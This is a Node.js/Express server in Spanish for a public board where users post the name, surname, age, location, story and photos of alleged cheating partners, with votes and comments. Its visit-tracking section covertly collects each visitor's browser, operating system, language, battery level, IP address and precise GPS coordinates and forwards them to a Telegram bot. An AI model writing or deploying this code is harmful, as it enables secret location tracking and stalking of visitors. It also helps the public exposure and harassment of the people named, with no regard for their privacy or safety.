import express from "express";
import cors from "cors";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";
import pkg from "pg";
const { Pool } = pkg;

const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true }));

// Multer para fotos
const upload = multer({ storage: multer.memoryStorage() });

// Conexión PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
});

// =======================
// SERVIR CARPETA PUBLIC
// =======================
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(path.join(__dirname, "public")));

// Al acceder a /, devuelve index.html
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// =======================
// GET – Lista de infieles con comentarios y votos
// =======================
app.get("/infieles", async (req, res) => {
    try {
        const infieles = await pool.query("SELECT * FROM infieles ORDER BY id DESC");
        const resultados = [];

        for (let infiel of infieles.rows) {
            const comentariosQ = await pool.query(
                "SELECT * FROM comentarios WHERE infiel_id=$1 ORDER BY created_at ASC",
                [infiel.id]
            );

            resultados.push({
                ...infiel,
                comentarios: comentariosQ.rows
            });
        }

        res.json(resultados);
    } catch (err) {
        console.error("Error GET:", err);
        res.status(500).json({ error: "Error al obtener datos" });
    }
});

// =======================
// POST – Crear publicación
// =======================
app.post("/nuevo", upload.array("fotos", 10), async (req, res) => {
    try {
        const { reportero, nombre, apellido, edad, ubicacion, historia } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];

        const result = await pool.query(
            `INSERT INTO infieles (reportero,nombre,apellido,edad,ubicacion,historia,fotos)
             VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
            [reportero || "Anónimo", nombre, apellido, edad, ubicacion, historia, fotos]
        );

        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error("Error POST:", err);
        res.status(500).json({ error: "No se pudo guardar" });
    }
});

// =======================
// POST – Votar
// =======================
app.post("/votar", async (req, res) => {
    try {
        const { infiel_id, usuario, voto } = req.body;

        await pool.query(
            `INSERT INTO votos (infiel_id, usuario, voto) VALUES ($1,$2,$3)
             ON CONFLICT (infiel_id, usuario) DO NOTHING`,
            [infiel_id, usuario, voto]
        );

        if (voto) {
            await pool.query("UPDATE infieles SET votos_reales=votos_reales+1 WHERE id=$1", [infiel_id]);
        } else {
            await pool.query("UPDATE infieles SET votos_falsos=votos_falsos+1 WHERE id=$1", [infiel_id]);
        }

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al votar" });
    }
});

// =======================
// POST – Agregar comentario
// =======================
app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
    try {
        const { infiel_id, nombre, texto, propietario } = req.body;
        const fotos = req.files?.map(f => f.buffer.toString("base64")) || [];

        const result = await pool.query(
            `INSERT INTO comentarios (infiel_id,nombre,texto,fotos,propietario)
             VALUES ($1,$2,$3,$4,$5) RETURNING *`,
            [infiel_id, nombre || "Anónimo", texto, fotos, propietario || false]
        );

        res.json({ success: true, data: result.rows[0] });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Error al guardar comentario" });
    }
});




// =======================
// TRACKING DE VISITAS - DICIEMBRE 2025
// =======================

let visitaTemporal = null;

// Recibe datos del dispositivo (ajax.js)
app.post("/recibe-info", (req, res) => {
    try {
        const { agent = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;

        // Detección navegador (igual que tu PHP antiguo)
        let navegador = "Desconocido";
        if (agent.includes("Brave")) navegador = agent.match(/Brave\/([0-9.]+)/) ? `Brave ${RegExp.$1}` : "Brave";
        else if (agent.includes("Edg")) navegador = `Edge ${agent.match(/Edg\/([0-9.]+)/)?.[1] || ""}`;
        else if (agent.includes("OPR") || agent.includes("Opera")) navegador = `Opera ${agent.match(/OPR\/([0-9.]+)/)?.[1] || ""}`;
        else if (agent.includes("Firefox")) navegador = `Firefox ${agent.match(/Firefox\/([0-9.]+)/)?.[1] || ""}`;
        else if (agent.includes("Safari") && !agent.includes("Chrome")) navegador = `Safari ${agent.match(/Version\/([0-9.]+)/)?.[1] || ""}`;
        else if (agent.includes("Chrome")) navegador = `Chrome ${agent.match(/Chrome\/([0-9.]+)/)?.[1] || ""}`;

        // Sistema operativo
        let sistema = agent.includes("Windows NT 10") ? "Windows 10" :
                      agent.includes("Windows NT 6.3") ? "Windows 8.1" :
                      agent.includes("Windows NT 6.1") ? "Windows 7" :
                      agent.includes("Android") ? "Android" :
                      (agent.includes("iPhone") || agent.includes("iPad")) ? "iOS" :
                      agent.includes("Linux") ? "Linux" : "Desconocido";

        let arquitectura = dystro.includes("armv7") ? " (32 bits)" :
                          dystro.includes("armv8") || dystro.includes("aarch64") ? " (64 bits)" : " (64 bits)";

        let idiomaTexto = idioma === "es-MX" ? "Español (México)" :
                         idioma === "es-ES" ? "Español (España)" :
                         idioma === "en-US" ? "Inglés (EE.UU)" : idioma || "Desconocido";

        let bateriaTexto = bateri !== 'N/A' ? `${bateri}%` : "Desconocido";

        visitaTemporal = {
            navegador, sistema: `${sistema}${arquitectura}`, idioma: idiomaTexto, bateria: bateriaTexto, agent: agent.substring(0,150)
        };

        res.json({ status: 'ok' });
    } catch (err) {
        res.status(500).json({ error: "Error" });
    }
});

// Recibe ubicación y envía TODO a Telegram
app.post("/location", async (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
        const hora = new Date().toLocaleString('es-VE', { timeZone: 'America/Caracas' });

        let msg = "📍 <b>NUEVA VISITA</b>\n\n";
        msg += `🌐 IP: ${ip}\n\n`;

        if (latitude && longitude) {
            msg += `📌 Lat: ${latitude}\n📌 Lon: ${longitude}\n🎯 Precisión: ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}\n`;
            msg += `🌍 <a href="https://maps.google.com/?q=${latitude},${longitude}">Ver mapa</a>\n\n`;
        } else {
            msg += "❌ Ubicación bloqueada\n\n";
        }

        msg += "<b>Dispositivo:</b>\n";
        if (visitaTemporal) {
            msg += `- Navegador: ${visitaTemporal.navegador}\n`;
            msg += `- SO: ${visitaTemporal.sistema}\n`;
            msg += `- Idioma: ${visitaTemporal.idioma}\n`;
            msg += `- Batería: ${visitaTemporal.bateria}\n`;
            msg += `- UA: ${visitaTemporal.agent}\n`;
        } else {
            msg += "Sin datos del dispositivo\n";
        }

        msg += `\n⏰ Hora VZLA: ${hora}`;

        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: msg,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        visitaTemporal = null; // limpiar
        res.json({ status: 'logged' });
    } catch (err) {
        res.status(500).json({ error: "Error" });
    }
});


// =======================
// INICIAR SERVIDOR
// =======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("API lista en puerto", PORT));
